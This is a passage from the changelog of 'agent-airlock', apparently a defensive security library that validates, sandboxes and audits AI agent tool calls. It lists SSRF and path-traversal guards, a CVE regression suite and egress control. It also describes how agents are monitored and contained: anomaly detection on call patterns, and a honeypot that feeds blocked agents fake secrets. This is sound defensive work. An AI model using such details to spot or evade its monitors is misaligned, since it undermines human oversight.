  for ASI10 (Rogue Agents) — we surface the telemetry but do not
  quarantine. New MCP-specific sub-table points at the
  `OWASP_MCP_TOP_10_2026` preset.
- **`DockerBackend` timeout now honored** (`sandbox_backend.py`). The
  `timeout: int = 60` parameter was a TODO since v0.4.0 — a runaway
  function could hang forever. v0.5.1 uses `container.wait(timeout=...)`
  with kill-and-remove cleanup. Also hardened by default:
  `no-new-privileges`, `cap_drop=["ALL"]`, and a `security_opt`
  parameter for caller-supplied seccomp profiles. Four opt-in
  integration tests behind the new `pytest -m docker` marker
  (`tests/test_sandbox_backend_docker_integration.py`); default CI
  runs exclude them so no Docker daemon is required. Closes #2.

### Performance
- `@Airlock` strict-validation path: median **75.2 μs**
  (v0.5.0: ~77 μs). No regression — v0.5.1 is additive; the sanitizer
  and task-budget helpers live outside the decorator hot path.

### Dependencies
- No new runtime deps.

### Primary sources
- Ox Security advisory (2026-04-16):
  <https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem>
- The Register on Anthropic's "expected behavior" response (2026-04-16):
  <https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/>
- Anthropic task-budgets beta:
  <https://platform.claude.com/docs/en/build-with-claude/task-budgets>
- OWASP Top 10 for Agentic Applications 2026:
  <https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/>

---

## [0.5.0] - 2026-04-18 — "April 2026"

First release of the April 2026 roadmap (#6). Turns agent-airlock into a
runtime-compliant MCP 2025-11-25 defender: ships the CVE regression suite,
2026 policy presets, Google Model Armor adapter, A2A protocol middleware,
Claude Agent SDK extra, and fixes two real defence-in-depth bugs caught in
deep analysis.

### Added
- **MCP 2025-11-25 spec compliance helpers** (`agent_airlock.mcp_spec`): OAuth 2.1 + PKCE S256 utilities (PKCE generate/verify with RFC 7636 test vector, redirect URI allow-list, Bearer + `WWW-Authenticate` header parsers, RFC 8707 resource-URI canonicalisation, Authorization Server + Protected Resource Metadata Pydantic models enforcing `S256` in `code_challenge_methods_supported`, JWT audience validator), Tasks primitive (SEP-1686) Pydantic models (`Task`, `TaskStatus`, `TaskGetRequest`, `TaskCancelRequest`, five-state lifecycle), and Streamable HTTP transport validators (`MCP-Protocol-Version: 2025-11-25` header enforcement, rejects access tokens in query string, Content-Type / Accept rules, `WWW-Authenticate` on 401). 81 conformance tests. DPoP deliberately deferred — spec lists it as SEP-draft only.
- **Claude Agent SDK** (`claude-agent-sdk`) as an optional extra: install with `pip install "agent-airlock[claude-agent]"`. Renamed from Claude Code SDK in Sept 2025 ([anthropics/claude-agent-sdk-python](https://github.com/anthropics/claude-agent-sdk-python)). `examples/anthropic_integration.py` Example 7 already uses the new import path.
- **A2A protocol middleware** (`agent_airlock.a2a`): Pydantic V2 strict models for the [A2A v1.0](https://a2a-protocol.org/latest/specification/) JSON-RPC envelope and core `Message` / `Task` / `Part` shapes, plus a pluggable `A2AValidator` with an `A2ACustomValidator` hook. Schema validation only — transport (HTTP, gRPC, SSE) belongs in `a2a-sdk`. 25 tests cover envelope validation, method allow-lists, the `result` XOR `error` invariant, and hook lifecycle.
- **Google Cloud Model Armor adapter** (`agent_airlock.integrations.model_armor`): opt-in scanner that forwards prompts and model responses to [Model Armor](https://docs.cloud.google.com/model-armor/overview) and surfaces filter violations as structured `ModelArmorScanResult`s. Installed via `pip install "agent-airlock[model-armor]"`; enabled via `AIRLOCK_MODEL_ARMOR_ENABLED=1` + `AIRLOCK_MODEL_ARMOR_TEMPLATE=projects/P/locations/L/templates/T`. 14 tests against stub client. Several Google-side field names are flagged UNVERIFIED in the research log; the adapter uses `getattr` with safe fallbacks so schema drift degrades to "no detection" rather than crashing.
- **2026 policy presets** (`agent_airlock.policy_presets`): five incident- and standards-driven `SecurityPolicy` factories — `GTG_1002_DEFENSE` (Anthropic GTG-1002 disclosure), `MEX_GOV_2026` (Mexican-government breach, Feb 2026), `OWASP_MCP_TOP_10_2026` (OWASP MCP Top 10 beta), `EU_AI_ACT_ARTICLE_15` (applies Aug 2, 2026), `INDIA_DPDP_2023` (DPDP Act 2023 + India PII pack). Each preset is documented with primary-source citation and tested with canonical blocking + allowing scenarios (25 new tests).
- **CVE regression suite** (`tests/cves/`): 30 tests covering 7 disclosed MCP-adjacent CVEs — CVE-2025-59536 (Claude Code hooks RCE, exfil leg), CVE-2025-68143/44/45 (mcp-server-git path traversal / arg injection / repo root escape), CVE-2026-26118 (Azure MCP SSRF), CVE-2026-27825 (mcp-atlassian arbitrary write), CVE-2026-27826 (mcp-atlassian header SSRF, tool-param case). Each test reproduces the vulnerable tool-call pattern and asserts the matching airlock primitive blocks it. See `tests/cves/README.md` for out-of-scope CVEs.
- **Research log** (`docs/research-log.md`) tracking primary-source verifications that back every non-trivial change in the April 2026 roadmap (#6).

### Fixed
- **CI green on main** — removed an unused `# type: ignore[method-assign]` in `integrations/langchain.py` that began failing mypy 1.8+. Suppressed a bandit B104 false positive on the localhost blocklist check in `network.py`. Main had been red since Feb 6; PR #7 restored all three test matrix versions plus the `security` job.
- **Sensitive-parameter filter now catches compound names** (`user_password`, `my_api_key`, `aws_secret_key`, `session_cookie`, `db_token`, etc.). `_filter_sensitive_keys` previously used an exact-match frozenset lookup, letting custom-named parameters leak into debug logs. Fix: substring match against `SENSITIVE_PARAM_SUBSTRINGS`. Old `SENSITIVE_PARAM_NAMES` constant retained for backward compatibility.
- **Capability gating now survives non-`functools.wraps` outer decorators.** `get_required_capabilities` now walks the `__wrapped__` chain (bounded to 32 hops) so that any outer decorator preserving `__wrapped__` continues to surface `__airlock_capabilities__`. Previously a naive wrapper that did not copy `__dict__` would cause `@requires` to silently degrade to `Capability.NONE` — a bypass. 7 TDD regression tests in `tests/test_deep_analysis_bugs.py`.

### Documentation
- **April 2026 briefing pack** committed to tree: `ECOSYSTEM_STATE_2026-04.md`, `ROADMAP_2026.md`, `LAUNCH_PLAYBOOK_2026.md`, `DEEP_ANALYSIS.md`, `CROSS_PROJECT_SYNTHESIS.md`, `CLAUDE_PROMPT.md` (#8). Anchors the v0.5.0 roadmap in #6.

---

## [0.4.1] - 2026-03-15

### Added
- **Per-tool endpoint policies**: URL allowlisting per tool to prevent SSRF attacks (CVE-2026-26118 defense). New `EndpointPolicy` dataclass and `validate_endpoint()` function with wildcard matching, private IP blocking, and metadata URL blocking. Configurable via `[airlock.endpoints.<tool_name>]` in TOML.
- **Anomaly detection**: Real-time monitoring of tool call patterns with auto-blocking for anomalous sessions. New `AnomalyDetector` class detects call rate spikes, endpoint diversity spikes, high error rates, and consecutive blocked calls. Thread-safe with configurable sliding windows. Configurable via `[airlock.anomaly]` in TOML.
- **Credential scope declarations**: Per-tool minimum-privilege enforcement for MCP proxy credentials. New `CredentialScope` dataclass with scope validation, token age checks, freshness requirements, and audience verification. Configurable via `[airlock.credentials.<tool_name>]` in TOML.

### Security
- Direct mitigation for CVE-2026-26118 (Azure MCP Server SSRF) via endpoint allowlisting
- Defense against agent context-switching attacks (CVE-2026-12353) via anomaly detection
- Least-privilege enforcement via credential scope declarations

---

## [0.4.0] - 2026-02-01 — "Enterprise"

### ✨ New Features

- **Unknown Arguments Mode**: New `UnknownArgsMode` replaces boolean `strict_mode` with three explicit behaviors:
  - `BLOCK` - Reject calls with hallucinated arguments (production recommended)
  - `STRIP_AND_LOG` - Strip unknown args and log warnings (staging)
  - `STRIP_SILENT` - Silently strip unknown args (development)

- **Safe Types**: Built-in path and URL validation types that work with Pydantic:
  - `SafePath` - Validates file paths against traversal attacks
  - `SafePathStrict` - Stricter path validation with deny patterns
  - `SafeURL` - Validates URLs with protocol enforcement
  - `SafeURLAllowHttp` - Allows both HTTP and HTTPS

- **Capability Gating**: Fine-grained permission system for tool operations:
  - `@requires(Capability.FILESYSTEM_READ)` decorator
  - Predefined policies: `STRICT_CAPABILITY_POLICY`, `READ_ONLY_CAPABILITY_POLICY`
  - Flag-based capabilities: combine with `|` operator

- **Pluggable Sandbox Backends**: Choose your execution environment:
  - `E2BBackend` - E2B Firecracker MicroVMs (recommended)
  - `DockerBackend` - Docker containers (local development)
  - `LocalBackend` - Unsafe local execution (testing only)

- **Circuit Breaker**: Prevent cascading failures with fault tolerance:
  - `CircuitBreaker` with CLOSED/OPEN/HALF_OPEN states
  - Configurable failure thresholds and recovery timeouts
  - Predefined configs: `AGGRESSIVE_BREAKER`, `CONSERVATIVE_BREAKER`

- **Cost Tracking**: Monitor and limit API spending:
  - `CostTracker` with per-tool and aggregate tracking
  - `BudgetConfig` with hard/soft limits and alerts
  - `CostCallback` protocol for external system integration
  - `BudgetExceededError` when limits are reached

- **Retry Policies**: Intelligent retry with exponential backoff:
  - `RetryPolicy` with configurable attempts and delays
  - Jitter support to prevent thundering herd
  - Predefined policies: `FAST_RETRY`, `STANDARD_RETRY`, `PATIENT_RETRY`
  - Exception filtering with `NETWORK_EXCEPTIONS`

- **OpenTelemetry Observability**: Enterprise-grade monitoring:
  - `OpenTelemetryProvider` for distributed tracing
  - `observe()` context manager and decorator
  - Span attributes, events, and metrics
  - `OTelAuditExporter` for audit log integration

- **MCP Proxy Guard**: Enhanced MCP security:
  - `MCPProxyGuard` prevents token passthrough attacks
  - `MCPSession` binding for request authentication
  - Configurable with `STRICT_PROXY_CONFIG`, `PERMISSIVE_PROXY_CONFIG`

- **CLI Tools**: New command-line utilities:
  - `airlock doctor` - Diagnose configuration issues
  - `airlock verify` - Validate security setup

### 🔧 Improvements

- Enhanced audit logging with OpenTelemetry export support
- Better error messages for capability denials
- Improved thread safety in rate limiters and circuit breakers

---

## [0.3.0] - 2026-02-01 — "Vaccine"

### ✨ New Features

- **Filesystem Path Validation**: Bulletproof protection against directory traversal:
  - `FilesystemPolicy` with allowed roots and deny patterns
  - Uses `os.path.commonpath()` (CVE-resistant, not string prefix matching)
  - Symlink blocking to prevent escape attacks
  - Predefined: `RESTRICTIVE_FILESYSTEM_POLICY`, `SANDBOX_FILESYSTEM_POLICY`

- **Network Egress Control**: Block data exfiltration during tool execution:
  - `NetworkPolicy` with host/port allowlists
  - `network_airgap()` context manager blocks all outbound connections
  - Socket monkeypatching with thread-local storage for safety
  - Predefined: `NO_NETWORK_POLICY`, `INTERNAL_ONLY_POLICY`, `HTTPS_ONLY_POLICY`

- **Honeypot Deception Protocol**: Return fake success instead of errors:
  - `BlockStrategy.HONEYPOT` returns plausible fake data
  - Prevents agents from knowing access was blocked
  - `DefaultHoneypotGenerator` with sensible fake values
  - Example: Agent reads `.env` → gets `API_KEY=mickey_mouse_123`

- **Framework Vaccination**: One-line security for existing code:
  - `vaccinate("langchain")` automatically secures all `@tool` functions
  - Monkeypatches framework decorators to inject Airlock
  - Supports: LangChain, OpenAI Agents SDK, PydanticAI, CrewAI
  - `unvaccinate()` to restore original behavior

### 🔧 Improvements

- Path-like parameter detection with intelligent heuristics
- Callback hooks: `on_blocked`, `on_rate_limit`, `on_validation_error`

---

## [0.2.0] - 2026-02-01

### ✨ New Features

- **Security Hardening**: Comprehensive security review and fixes
- **Production Roadmap**: Clear path to enterprise readiness

### 🐛 Fixes

- Skip cloudpickle tests when package not installed
- Resolve all ruff lint and format errors for CI

---

## [0.1.5] - 2026-01-31

### ✨ New Features

- **Streaming Support**: `StreamingAirlock` for generator functions:
  - Per-chunk PII/secret sanitization
  - Cumulative output truncation across chunks
  - Sync and async generator support

- **Context Propagation**: `AirlockContext` with `contextvars`:
  - `get_current_context()` available inside tools
  - `ContextExtractor` for RunContextWrapper pattern
  - Request-scoped state management

- **Dynamic Policy Resolution**: Policies can now be functions:
  - `Callable[[AirlockContext], SecurityPolicy]` support
  - Enables workspace/tenant-specific policies
  - Context extracted from first arg with `.context` attribute

- **Conversation Tracking**: Multi-turn state management:
  - `ConversationTracker` tracks tool calls across turns
  - `ConversationConstraints` with budget management
  - Cross-call tracking for agent loops

### 🔧 Improvements

- 99% test coverage (enforced 80% in CI)
- 647 tests covering all features

---

## [0.1.3] - 2026-01-31

### ✨ New Features

- **Framework Compatibility**: Full support for major AI frameworks:
  - LangChain with `@tool` decorator
  - LangGraph with `ToolNode` and `StateGraph`
  - OpenAI Agents SDK with `@function_tool`
  - PydanticAI, CrewAI, AutoGen, LlamaIndex, smolagents

- **Signature Preservation**: Critical fix for framework introspection:
  - Copies `__signature__` and `__annotations__` to wrapper
  - Preserves Pydantic V2 attributes (`__pydantic_*`)
  - Enables LLMs to see correct function parameters

### 🔧 Improvements

- README upgraded to top 1% standards
- Comprehensive framework integration examples

### 🔒 Security

- Fixed all vulnerabilities from security scan
- Sensitive parameter names filtered from debug logs

---

## [0.1.2] - 2026-01-31

### 🔧 Improvements

- Switched to API token auth for PyPI publish
- README rewritten as manifesto for launch

### 🐛 Fixes

- Resolved mypy unused-ignore error for tomli import

---

## [0.1.1] - 2026-01-31

### ✨ New Features

- **Policy Engine**: RBAC for AI agents:
  - `SecurityPolicy` with allow/deny tool lists
  - `RateLimit` with token bucket algorithm
  - `TimeWindow` for time-based restrictions
  - Predefined: `PERMISSIVE_POLICY`, `STRICT_POLICY`, `READ_ONLY_POLICY`, `BUSINESS_HOURS_POLICY`

- **Output Sanitization**: PII and secret masking:
  - 12 data types: email, phone, SSN, credit card, API keys, etc.
  - India-specific: Aadhaar, PAN, UPI ID, IFSC
  - 4 masking strategies: FULL, PARTIAL, TYPE_ONLY, HASH
  - Token/character truncation with configurable limits

- **FastMCP Integration**: MCP-native security:
  - `@secure_tool(mcp)` decorator
  - `MCPAirlock` for MCP-specific features
  - `create_secure_mcp_server()` factory function

- **Audit Logging**: JSON Lines format:
  - `AuditLogger` with thread-safe writes
  - Configurable log path
  - Full call tracing with args/results

### 📝 Documentation

- Complete Phase 6 launch preparation
- Security best practices guide

---

## [0.1.0] - 2026-01-31

### ✨ New Features

- **Core Validator**: The `@Airlock` decorator:
  - Ghost argument detection and stripping
  - Pydantic V2 strict validation (no type coercion)
  - Self-healing error responses with `fix_hints`

- **E2B Sandbox Integration**: Isolated execution:
  - `SandboxPool` with warm pool management
  - Function serialization via cloudpickle
  - `sandbox_required=True` prevents local fallback

- **Configuration System**: Flexible config priority:
  - Environment variables (`AIRLOCK_*`)
  - Constructor parameters
  - TOML config files (`airlock.toml`)

### 🔧 Improvements

- Full async/await support
- Comprehensive type hints throughout

---

## Links

- [Documentation](https://github.com/sattyamjjain/agent-airlock#readme)
- [PyPI Package](https://pypi.org/project/agent-airlock/)
- [Issue Tracker](https://github.com/sattyamjjain/agent-airlock/issues)
